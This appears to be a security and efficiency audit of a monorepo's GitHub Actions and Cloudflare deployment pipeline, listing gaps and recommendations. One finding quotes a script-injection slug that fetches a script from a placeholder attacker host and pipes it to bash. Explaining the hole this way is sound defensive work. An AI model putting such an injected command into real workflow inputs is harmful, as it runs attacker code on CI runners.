# CI/CD Pipeline Audit — DevSage

**Date:** 2026-02-15
**Scope:** All GitHub Actions workflows, Turborepo config, git hooks, deployment scripts
**Branch:** `main`

---

## 1. Executive Summary

**Maturity Level: Early-Stage (2/5)**

DevSage has a functional CI/CD pipeline that deploys 5 apps (API + 4 frontends) to Cloudflare Workers/Pages via GitHub Actions. The pipeline has improved significantly during this audit pass — a quality gate (typecheck → lint → test) was added before deploy, change detection was wired in, and the hackathon site workflow's script injection vulnerability was fixed.

However, the pipeline still lacks several production-readiness markers: no staging environment, no deploy previews, no Dependabot/Renovate, no coverage enforcement, no npm audit, no E2E tests, and no rollback mechanism. Deploys go straight to production on push to `main` with no approval gate.

### What Changed in This Audit

| Item | Before | After |
|------|--------|-------|
| Quality gate in `deploy.yml` | ❌ None — deploy on push, no checks | ✅ `quality-gate` job: typecheck → lint → test |
| Change detection | ❌ None — all apps deployed on every push | ✅ `dorny/paths-filter@v3` for selective deploy |
| `deploy-hackathon-site.yml` injection | ❌ Script injection via `${{ inputs.slug }}` in `run:` | ✅ Inputs passed via environment variables |
| `turbo` version | `"latest"` (unpinned) | `"^2.5.0"` (pinned with caret) |
| Dual lockfile | `package-lock.json` + `pnpm-lock.yaml` coexisted | `package-lock.json` removed |

---

## 2. Workflow Analysis

### 2.1 `deploy.yml` — Main Deploy Workflow

**File:** `.github/workflows/deploy.yml` (177 lines)
**Purpose:** Build and deploy all 5 apps to Cloudflare on push to `main` or manual dispatch.

#### Trigger Conditions

```yaml
on:
  push:
    branches: [main]
    paths: ['apps/**', 'packages/**', 'package.json', 'pnpm-lock.yaml']
  workflow_dispatch:
    inputs:
      app: { type: choice, options: [all, api, web, platform, admin, judge] }
```

- **Good:** Path filtering prevents deploys on docs-only changes.
- **Good:** Manual dispatch allows deploying individual apps.
- **Missing:** No `pull_request` trigger — PRs get zero CI feedback (no status checks).

#### Job Structure

```
quality-gate  →  detect-changes  →  deploy-{api,web,platform,admin,judge}
```

1. **`quality-gate`** (lines 27–41): Runs `pnpm typecheck`, `pnpm lint`, `pnpm test` sequentially. All 5 deploy jobs depend on this passing.
2. **`detect-changes`** (lines 43–71): Uses `dorny/paths-filter@v3` to determine which apps changed. Only fires on `push` events (skipped for `workflow_dispatch`).
3. **`deploy-*`** (lines 73–177): Five parallel deploy jobs, each with conditional logic: deploy if the app changed, OR if `packages/**` changed, OR if manually triggered.

#### Security Concerns

| Issue | Severity | Line(s) | Details |
|-------|----------|---------|---------|
| No `permissions:` block | Medium | — | Workflow runs with default `GITHUB_TOKEN` permissions (write-all for push events). Should restrict to `contents: read` |
| No `environment:` protection | High | 90–92 | `CLOUDFLARE_API_TOKEN` is used without GitHub Environment protection rules. No approval gates before production deploy |
| Redundant `pnpm install` | Low | 88, 109, 130, 151, 172 | Each deploy job re-runs `pnpm install --frozen-lockfile`. Should use a shared artifact or cache |
| No concurrency control | Medium | — | Multiple pushes to `main` can trigger overlapping deploys. Add `concurrency: { group: deploy-${{ github.ref }} }` |

#### Efficiency Issues

- **6 separate `pnpm install` calls** — the quality-gate job plus each of 5 deploy jobs all run `pnpm install` independently. This wastes ~2–3 minutes per job.
- **Sequential quality gate** — typecheck, lint, and test run sequentially. They could run in parallel as separate jobs or via Turborepo's parallelism.
- **No Turborepo remote cache** — builds are not cached across CI runs. Each push rebuilds from scratch.
- **No action caching for wrangler** — wrangler is re-downloaded every run.

---

### 2.2 `deploy-hackathon-site.yml` — Hackathon Site Deployment

**File:** `.github/workflows/deploy-hackathon-site.yml` (62 lines)
**Purpose:** Generate and deploy individual hackathon participant sites from a template repo.

#### Trigger Conditions

```yaml
on:
  workflow_dispatch:
    inputs: { slug, title, workspace_slug, accent_color, description }
```

Manual-only trigger — appropriate for on-demand site generation.

#### Security Concerns — Script Injection (FIXED)

**Before this audit:** The original workflow used `${{ inputs.slug }}` directly in `run:` blocks, which is a **critical script injection vulnerability** (CWE-78). An attacker with write access could craft a slug like `"; curl evil.com/steal | bash; echo "` and execute arbitrary code in the CI runner.

**After fix (current state, lines 43–48):** Inputs are now passed as environment variables:

```yaml
- name: Generate hackathon site
  run: |
    node scripts/generate-hackathon-site.js --config "$CONFIG_B64"
  env:
    CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    CONFIG_B64: ${{ toJSON(inputs) }}
```

**Remaining concern (lines 56–59):** The Summary step still uses `${INPUT_SLUG}` and `${INPUT_TITLE}` in `echo` commands. While these are passed as env vars (not expression-injected), the `echo` to `$GITHUB_STEP_SUMMARY` could be exploited for **summary HTML injection** if inputs contain markdown/HTML. Low severity since it's a workflow_dispatch (requires repo write access), but should sanitize.

#### Other Issues

| Issue | Severity | Details |
|-------|----------|---------|
| No `permissions:` block | Medium | Runs with default permissions |
| `GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}` | Low | Default token scoping is fine for same-org, but the script creates repos in `SHIKDD-org` — may need a PAT for cross-repo operations |
| No status reporting | Low | No Slack/Discord notification on success/failure |

---

### 2.3 `secret-scan.yml` — Secret Scanning

**File:** `.github/workflows/secret-scan.yml` (29 lines)
**Purpose:** Run gitleaks on every PR and push to `main`.

#### Assessment: Well-Configured ✅

```yaml
permissions:
  contents: read
```

- **Good:** Minimal permissions (only `contents: read`).
- **Good:** `fetch-depth: 0` for full history scan.
- **Good:** Uses `gitleaks/gitleaks-action@v2` with custom config (`.gitleaks.toml`).
- **Good:** Triggers on both `pull_request` and `push` to `main`.
- **Good:** Redacts secrets in output (`--redact`).

#### Minor Issues

| Issue | Severity | Details |
|-------|----------|---------|
| Action not pinned to SHA | Low | `gitleaks/gitleaks-action@v2` should be `@v2` + SHA pin for supply chain safety |
| No SARIF upload | Low | Could upload results to GitHub Security tab via `upload-artifact` |

---

## 3. Quality Gates (Before and After)

### Before This Audit

| Gate | Status | Details |
|------|--------|---------|
| Typecheck before deploy | ❌ Missing | Code deployed without type verification |
| Lint before deploy | ❌ Missing | Code deployed without lint checks |
| Tests before deploy | ❌ Missing | Code deployed without test execution |
| Secret scan on PR | ✅ Existed | `secret-scan.yml` with gitleaks |
| Secret scan pre-commit | ✅ Existed | `.husky/pre-commit` → `secretlint` via `lint-staged` |
| Secret scan pre-push | ✅ Existed | `.husky/pre-push` → full `secretlint` scan |
| Change detection | ❌ Missing | All 5 apps deployed on every push |

### Added During This Audit

| Gate | File | Details |
|------|------|---------|
| **`quality-gate` job** | `deploy.yml:27–41` | Typecheck → lint → test must pass before any deploy job runs |
| **Change detection** | `deploy.yml:43–71` | `dorny/paths-filter@v3` selectively triggers deploy jobs based on file changes |
| **Conditional deploy** | `deploy.yml:75–77` (and similar) | Deploy jobs only run if their app or `packages/**` changed |

### Still Missing

| Gate | Priority | Details |
|------|----------|---------|
| **PR status checks** | 🔴 Critical | `deploy.yml` only triggers on `push` to `main`. PRs get no CI feedback. Need a separate `ci.yml` workflow or add `pull_request` trigger |
| **Branch protection** | 🔴 Critical | No evidence of required status checks on `main`. Anyone with write access can push directly |
| **Coverage threshold** | 🟡 Medium | No coverage reporting or enforcement. Tests pass/fail but no minimum coverage gate |
| **Build verification** | 🟡 Medium | Quality gate runs `pnpm typecheck` but each deploy job also runs individual `build`. A failed build in one app doesn't block others |
| **Deploy approval** | 🟡 Medium | No GitHub Environment protection rules. Production deploys happen automatically |
| **npm audit** | 🟡 Medium | No vulnerability scanning of dependencies in CI |

---

## 4. Security Issues

### 4.1 Script Injection — `deploy-hackathon-site.yml` (FIXED)

**Vulnerability:** CWE-78 (OS Command Injection)
**Status:** ✅ Fixed — inputs now passed via `env:` block, not interpolated into `run:`.
**Residual risk:** Summary step (lines 52–62) echoes env vars into `$GITHUB_STEP_SUMMARY`. Low risk (workflow_dispatch only).

### 4.2 Secret Management

| Aspect | Status | Details |
|--------|--------|---------|
| CI secrets | ✅ Good | `CLOUDFLARE_API_TOKEN` stored in GitHub Secrets, referenced as `${{ secrets.CLOUDFLARE_API_TOKEN }}` |
| Local dev secrets | ✅ Good | `apps/api/.dev.vars` (gitignored) |
| Production secrets | ✅ Good | Uploaded via `wrangler secret put` / `wrangler secret bulk` |
| Secret scanning (CI) | ✅ Good | gitleaks on every PR + push |
| Secret scanning (local) | ✅ Good | secretlint pre-commit + pre-push hooks |
| Test secrets | ⚠️ Caution | `vitest.config.ts` contains hardcoded test secrets (`dev-secret-key-min-32-chars-long!!`). These are dev-only bindings — acceptable but should be in a `.env.test` |
| `GITHUB_TOKEN` scope | ⚠️ Caution | `deploy-hackathon-site.yml` uses default `GITHUB_TOKEN`. If the script needs to create repos in `SHIKDD-org`, this may fail silently |

### 4.3 Workflow Permissions

| Workflow | `permissions:` | Risk |
|----------|----------------|------|
| `deploy.yml` | ❌ Not set | Runs with default write-all on push triggers |
| `deploy-hackathon-site.yml` | ❌ Not set | Runs with default write-all |
| `secret-scan.yml` | ✅ `contents: read` | Properly restricted |

**Recommendation:** Add `permissions: { contents: read }` to all workflows. Only escalate specific permissions where needed.

### 4.4 Action Pinning

| Action | Current | Recommendation |
|--------|---------|---------------|
| `actions/checkout` | `@v4` | Pin to SHA: `@v4` + comment with SHA |
| `actions/setup-node` | `@v4` | Pin to SHA |
| `pnpm/action-setup` | `@v4` | Pin to SHA |
| `dorny/paths-filter` | `@v3` | Pin to SHA |
| `gitleaks/gitleaks-action` | `@v2` | Pin to SHA |

Using `@v4` is acceptable for trusted first-party actions, but third-party actions (`dorny`, `gitleaks`) should be SHA-pinned to prevent supply chain attacks.

### 4.5 Branch Protection (NOT CONFIGURED)

No evidence of required branch protection rules on `main`:
- No required status checks
- No required reviews
- No force-push prevention verified in CI config
- Direct pushes to `main` can bypass all quality gates

---

## 5. Build Pipeline

### 5.1 Turborepo Configuration

**File:** `turbo.json`

```json
{
  "tasks": {
    "build":     { "dependsOn": ["^build"], "outputs": ["dist/**"] },
    "dev":       { "dependsOn": ["^build"], "cache": false, "persistent": true },
    "test":      { "dependsOn": ["^build"] },
    "lint":      { "dependsOn": [] },
    "typecheck": { "dependsOn": ["^build"] }
  }
}
```

**Task Graph Analysis:**

- `build`, `test`, `typecheck` all depend on `^build` (upstream packages must build first). This means `@devsage/shared` and `@devsage/db` build before any app.
- `lint` has no dependencies — runs immediately in parallel.
- `dev` is correctly marked `cache: false` and `persistent: true`.

**Issues:**

| Issue | Severity | Details |
|-------|----------|---------|
| No `inputs` configured | Medium | Turbo uses all files as cache keys by default. Define `inputs` per task to improve cache hit rates (e.g., `test` shouldn't re-run when only CSS changes) |
| No remote cache | High | Local cache only (`turbo run build` caches in `.turbo/`). CI runs start cold every time. Enable Vercel Remote Cache or self-hosted |
| No `outputs` on `test`/`lint` | Low | Test and lint produce no artifacts, so this is correct (implicit empty outputs = no caching of outputs). But test results could be cached if `inputs` are defined |
| `globalDependencies: ["package.json"]` | Low | Changes to root `package.json` invalidate ALL task caches. Consider narrowing to specific fields |

### 5.2 Build Order and Parallelism

The dependency graph flows:

```
@devsage/config (no build)
     ↓
@devsage/shared (tsc --build → dist/)
     ↓
@devsage/db (tsc → dist/)
     ↓
@devsage/api (tsc --noEmit → no dist, wrangler deploy bundles from src)
@devsage/web (tsc --noEmit + vite build → dist/)
@devsage/platform (tsc --noEmit + vite build → dist/)
@devsage/admin (tsc --noEmit + vite build → dist/)
@devsage/judge (tsc --noEmit + vite build → dist/)
```

- `shared` and `db` build sequentially (db depends on config, not shared — but both are fast).
- All 5 apps can build in parallel after packages complete.
- **CI doesn't leverage this** — each deploy job builds only its own app, missing the parallel opportunity.

### 5.3 Build Time Optimization Opportunities

1. **Share `pnpm install` output across jobs** — Use `actions/cache` or upload `node_modules` as artifact. Current: ~2 min × 6 jobs = 12 min wasted.
2. **Enable Turborepo remote cache** — Would make subsequent CI runs near-instant for unchanged packages.
3. **Run quality gate tasks in parallel** — `pnpm typecheck & pnpm lint & pnpm test` or use `turbo run typecheck lint test` which auto-parallelizes.
4. **Use `--filter` in CI** — `turbo run build --filter=@devsage/api...` to only build the app and its dependencies.

---

## 6. Testing in CI

### 6.1 What Tests Run in CI

The `quality-gate` job runs `pnpm test` which executes `turbo run test` across all packages:

| Package | Test Command | Framework | Test Files | Approximate Count |
|---------|-------------|-----------|------------|-------------------|
| `@devsage/api` | `vitest run` | `@cloudflare/vitest-pool-workers` | 20 test files | ~180 test cases |
| `@devsage/web` | `vitest run` | jsdom + testing-library | 0 test files | 0 tests |
| `@devsage/platform` | `vitest run --passWithNoTests` | jsdom + testing-library | 0 test files | 0 tests |
| `@devsage/admin` | `vitest run --passWithNoTests` | jsdom + testing-library | 0 test files | 0 tests |
| `@devsage/judge` | `vitest run --passWithNoTests` | jsdom + testing-library | 0 test files | 0 tests |
| `@devsage/shared` | `vitest run` | vitest | 1 test file | ~20 test cases |

**Key observation:** Only the API and shared package have tests. All 4 frontend apps use `--passWithNoTests` — they contribute zero test coverage.

### 6.2 Test Isolation

- **API tests:** Run in `@cloudflare/vitest-pool-workers` with `singleWorker: true` and `isolatedStorage: false`. Tests share the Workers runtime and D1 database. Each test file calls `resetDb()` in `beforeEach` — good isolation pattern but sequential execution is required.
- **Shared tests:** Standard vitest, no special isolation needed.
- **Frontend tests:** Non-existent.

### 6.3 Flaky Test Handling

**No flaky test handling exists.** There is no:
- Retry mechanism (`vitest` supports `--retry` but it's not configured)
- Test quarantine system
- Flaky test tracking or reporting

~~The project has **~25 pre-existing test failures**~~ ✅ **All 25 test failures have been resolved** (as of 2026-02-28). All 24 test files pass (223 tests, 0 failures). The `--passWithNoTests` flag on frontend apps remains since those packages still have zero test files.

### 6.4 Coverage Reporting

**No coverage reporting exists.**

- No `--coverage` flag in any test command
- No coverage threshold configured in any `vitest.config.ts`
- No coverage upload to Codecov/Coveralls
- No coverage badge in README

---

## 7. Deployment Strategy

### 7.1 How Deploy Works

Each app deploys independently to Cloudflare:

| App | Deploy Command | Target | Method |
|-----|---------------|--------|--------|
| API | `wrangler deploy` | Cloudflare Workers | Direct Worker upload |
| Web | `pnpm build && wrangler deploy` | Cloudflare Workers (static) | Vite build → Workers static |
| Platform | `pnpm build && wrangler deploy` | Cloudflare Workers (static) | Vite build → Workers static |
| Admin | `pnpm build && wrangler deploy` | Cloudflare Workers (static) | Vite build → Workers static |
| Judge | `pnpm build && wrangler deploy` | Cloudflare Workers (static) | Vite build → Workers static |

### 7.2 Deployment Pattern: Direct Push (No Blue-Green, No Canary)

- **Strategy:** Direct atomic deployment via `wrangler deploy`.
- **No blue-green:** Cloudflare Workers deployments are atomic — the new version replaces the old instantly.
- **No canary:** No gradual traffic shifting. 100% of traffic hits the new version immediately.
- **No staging:** Only production environment exists (`wrangler deploy`). The `deploy:dev` scripts exist in `package.json` but are not used in CI.

### 7.3 Rollback Capability

- **Cloudflare Workers:** Supports instant rollback via `wrangler rollback` or re-deploying a previous version. However, this is not automated — requires manual intervention.
- **Database migrations:** No rollback mechanism. Drizzle migrations are forward-only. A bad migration requires a manual fix.
- **No deploy tracking:** No deployment IDs, tags, or release notes are generated during CI deploy.

### 7.4 Environment Management

| Environment | Usage | CI Workflow |
|-------------|-------|-------------|
| Production | `wrangler deploy` | `deploy.yml` (push to `main`) |
| Dev | `wrangler deploy --env dev` | ❌ Not used in CI |
| Local | `wrangler dev --local` | N/A |

**No staging environment in CI.** The `deploy:dev` scripts exist but are never triggered by any workflow. There is no promotion flow (dev → staging → production).

---

## 8. Missing CI/CD Components

### 8.1 No Dependabot or Renovate

**Status:** ❌ Not configured.

No `.github/dependabot.yml` or `renovate.json` exists. Dependencies are manually updated. The commit history shows manual Dependabot vulnerability fixes (`a16e009`, `486b0cf`), suggesting Dependabot security alerts are enabled at the GitHub level but automated PRs are not.

**Impact:** Dependencies drift out of date. Security vulnerabilities in transitive dependencies go unnoticed until manually checked.

### 8.2 No `npm audit` / `pnpm audit` in CI

No dependency vulnerability scanning runs in CI. The pre-commit hook only checks for secrets (secretlint), not vulnerable packages.

### 8.3 No Lighthouse / Performance Checks

No performance regression testing in CI. The frontend apps have no bundle size tracking, no Lighthouse CI, no Core Web Vitals monitoring.

### 8.4 No E2E Tests

No Playwright, Cypress, or other E2E framework. Confirmed by project docs: "No E2E: No Playwright in CI."

### 8.5 No Deploy Previews for PRs

PRs do not trigger any CI workflow (except `secret-scan.yml`). No preview deployments exist for frontend changes. Cloudflare Pages supports preview deployments but is not configured.

### 8.6 No Changelog Automation

No conventional commits enforcement, no auto-changelog generation, no release-please or semantic-release.

### 8.7 No Slack/Discord Notifications

No CI notifications on deploy success/failure. Failures are only visible in the GitHub Actions UI.

### 8.8 No Build Artifact Retention

Deploy jobs don't upload build artifacts. Failed deploys leave no artifacts for debugging.

---

## 9. Monorepo-Specific Concerns

### 9.1 Affected Package Detection

**Status:** ✅ Implemented (this audit).

`deploy.yml` uses `dorny/paths-filter@v3` (lines 54–71) to detect changes per app:

```yaml
filters: |
  api:      ['apps/api/**']
  web:      ['apps/web/**']
  platform: ['apps/platform/**']
  admin:    ['apps/admin/**']
  judge:    ['apps/judge/**']
  packages: ['packages/**']
```

**Limitation:** Any change to `packages/**` triggers ALL 5 deploy jobs. This is correct for safety (shared code affects all apps) but could be refined. A change to `packages/db` only affects `apps/api`, not the frontend apps.

### 9.2 Selective Deployment

Deploy jobs have conditional execution:

```yaml
if: >
  github.event_name == 'workflow_dispatch' && (...) ||
  needs.detect-changes.outputs.api == 'true' || needs.detect-changes.outputs.packages == 'true'
```

This prevents unnecessary deploys when only one app changes. However, the quality gate still runs the full test suite regardless of what changed.

### 9.3 Shared Dependency Versioning

All workspace packages use `workspace:*` protocol:

```json
"@devsage/shared": "workspace:*",
"@devsage/db": "workspace:*",
"@devsage/config": "workspace:*"
```

This is correct for a monorepo — always uses the local version. However, external dependency versions vary across apps:

| Dependency | API | Web | Platform | Admin | Judge |
|-----------|-----|-----|----------|-------|-------|
| `vitest` | `^3.2.4` | `^3.2.4` | `^3.2.4` | `^3.2.4` | `^3.2.4` |
| `typescript` | (root) | `^5.7.0` | `^5.7.0` | `^5.7.0` | `^5.7.0` |
| `wrangler` | `4.63.0` | `4.63.0` | `4.63.0` | `4.63.0` | `4.63.0` |
| `vite` | — | `^6.0.0` | `^6.0.0` | `^6.0.0` | `^6.0.0` |
| `@cloudflare/workers-types` | `^4.20241218.0` | — | — | — | — |

**Good:** `wrangler` is pinned to exact `4.63.0` across all apps.
**Concern:** Root `package.json` has `typescript: ^5.9.3` while apps have `^5.7.0`. pnpm deduplication handles this, but explicit alignment would be cleaner.

### 9.4 Lock File Management (FIXED)

**Before this audit:** Both `package-lock.json` (npm) and `pnpm-lock.yaml` (pnpm) existed in the repo. This caused confusion — `npm install` and `pnpm install` produced different dependency trees.

**After fix:** `package-lock.json` was removed. Only `pnpm-lock.yaml` remains. CI uses `pnpm install --frozen-lockfile` which correctly enforces the lockfile.

### 9.5 pnpm Workspace Configuration

**File:** `pnpm-workspace.yaml`

```yaml
packages:
  - apps/api
  - apps/admin
  - apps/judge
  - apps/platform
  - apps/web
  - packages/*

onlyBuiltDependencies:
  - esbuild
  - workerd
  - sharp
```

Apps are explicitly listed (not globbed) — this is fine for a small monorepo but requires manual updates when adding apps.

`onlyBuiltDependencies` restricts native builds to `esbuild`, `workerd`, and `sharp` — good for security and CI speed.

---

## 10. Recommendations

### Priority 1 — Critical (Do This Week)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 1 | **Add PR CI workflow** — Create `ci.yml` triggered on `pull_request` with typecheck + lint + test. PRs currently get zero feedback | 30 min | Prevents broken code from reaching `main` |
| 2 | **Enable branch protection on `main`** — Require status checks, require PR reviews, disable force push | 15 min | Prevents direct pushes bypassing quality gate |
| 3 | **Add `permissions:` to all workflows** — Restrict to `contents: read` by default | 10 min | Reduces blast radius of compromised actions |
| 4 | **Fix pre-existing test failures** — 25 broken tests may block the quality gate. Either fix them or skip known failures | 4–8 hrs | Unblocks reliable CI |

### Priority 2 — High (This Sprint)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 5 | **Add concurrency control** — `concurrency: { group: deploy-${{ github.ref }}, cancel-in-progress: true }` | 10 min | Prevents overlapping deploys |
| 6 | **Enable Turborepo remote cache** — `npx turbo link` or set `TURBO_TOKEN` + `TURBO_TEAM` in CI secrets | 30 min | Dramatically faster CI builds |
| 7 | **Configure Dependabot** — Add `.github/dependabot.yml` for npm ecosystem + GitHub Actions | 20 min | Automated security patches |
| 8 | **Pin third-party actions to SHA** — `dorny/paths-filter`, `gitleaks/gitleaks-action` | 15 min | Supply chain security |
| 9 | **Share `pnpm install` across jobs** — Use `actions/cache` or a setup job that uploads `node_modules` artifact | 1 hr | Saves ~10 min per workflow run |

### Priority 3 — Medium (This Month)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 10 | **Add staging environment** — Deploy to `--env dev` on PR merge, promote to production manually | 2–4 hrs | Catch issues before production |
| 11 | **Add coverage reporting** — Configure `vitest --coverage` + upload to Codecov | 1 hr | Visibility into test coverage |
| 12 | **Add `pnpm audit` to CI** — Run `pnpm audit --audit-level=high` in quality gate | 15 min | Catches vulnerable dependencies |
| 13 | **Add deploy notifications** — Slack/Discord webhook on deploy success/failure | 1 hr | Team awareness of deploys |
| 14 | **Refine `packages/**` detection** — Map `packages/db` → API only, `packages/shared` → all apps, `packages/config` → all apps | 1 hr | Fewer unnecessary deploys |

### Priority 4 — Nice to Have (This Quarter)

| # | Recommendation | Effort | Impact |
|---|----------------|--------|--------|
| 15 | **PR deploy previews** — Use Cloudflare Pages preview deployments for frontend PRs | 2–4 hrs | Visual review of frontend changes |
| 16 | **Bundle size tracking** — `rollup-plugin-visualizer` output compared to main branch | 2 hrs | Prevent bundle bloat |
| 17 | **E2E tests** — Playwright for critical user flows (login, hackathon creation, submission) | 1–2 weeks | End-to-end confidence |
| 18 | **Changelog automation** — Conventional commits + `release-please` or `changesets` | 4 hrs | Automated release notes |
| 19 | **GitHub Environment protection rules** — Require approval for production deploys | 30 min | Human review before production |
| 20 | **OIDC for Cloudflare** — Replace long-lived `CLOUDFLARE_API_TOKEN` with OIDC federation | 2 hrs | Eliminates stored credentials |

---

## Appendix A: File Reference

| File | Lines | Purpose |
|------|-------|---------|
| `.github/workflows/deploy.yml` | 177 | Main deploy pipeline |
| `.github/workflows/deploy-hackathon-site.yml` | 62 | Hackathon site generator |
| `.github/workflows/secret-scan.yml` | 29 | Gitleaks secret scanning |
| `.gitleaks.toml` | 24 | Gitleaks configuration |
| `.secretlintrc.cjs` | 14 | Secretlint configuration |
| `.lintstagedrc.cjs` | ~6 | Lint-staged config (secretlint on staged files) |
| `.husky/pre-commit` | 4 | Pre-commit hook (secretlint) |
| `.husky/pre-push` | 4 | Pre-push hook (full secret scan) |
| `turbo.json` | 37 | Turborepo task configuration |
| `pnpm-workspace.yaml` | 12 | pnpm workspace members |
| `package.json` (root) | 59 | Root scripts, devDependencies |
| `.nvmrc` | 1 | Node.js version: `20` |
| `apps/api/vitest.config.ts` | 23 | Workers pool vitest config |
| `apps/web/vitest.config.ts` | 14 | jsdom vitest config |
| `apps/api/wrangler.jsonc` | ~80 | Workers deployment config |

## Appendix B: Current CI/CD Flow Diagram

```
Push to main
     │
     ▼
┌─────────────────────┐
│   Path Filter        │  Only runs if apps/**, packages/**, package.json, or pnpm-lock.yaml changed
│   (GitHub trigger)   │
└──────────┬──────────┘
           ▼
┌─────────────────────┐
│   quality-gate       │  pnpm install → typecheck → lint → test (sequential)
│   (ubuntu-latest)    │
└──────────┬──────────┘
           ▼
┌─────────────────────┐
│   detect-changes     │  dorny/paths-filter → outputs per app
│   (ubuntu-latest)    │
└──────────┬──────────┘
           ▼
┌──────┬──────┬──────┬──────┬──────┐
│ API  │ Web  │Platf.│Admin │Judge │  Conditional: only if app or packages changed
│deploy│deploy│deploy│deploy│deploy│  Each: install → build → wrangler deploy
└──────┴──────┴──────┴──────┴──────┘
           │
           ▼
     Production (no staging, no approval, no rollback)
```
